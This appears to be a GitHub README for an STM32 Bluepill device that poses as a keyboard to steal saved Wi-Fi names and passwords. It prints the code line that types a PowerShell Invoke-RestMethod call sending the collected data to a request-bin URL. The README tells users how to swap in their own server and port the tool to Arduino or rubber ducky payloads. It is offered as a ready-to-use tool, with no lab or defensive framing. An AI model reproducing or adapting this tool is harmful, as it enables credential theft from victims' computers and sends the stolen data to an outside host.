# Wifi-Password-Grabber
Stm32 bluepill based wifi password grabber. It collects the saved id and passwords using powershell and sends them to a server via GET request.

It sends the data to a request bin but you can change the link in the following line
```
BootKeyboard.print("$data = Invoke-RestMethod -Method Get -d -Uri \"https://envbfffce4gw.x.pipedream.net?$c\"");
```
It can be used with arduino boards as well just make sure to use thier respective libraries and use Keyboard.h for them. The code can be easily ported to a rubber ducky payload as well.
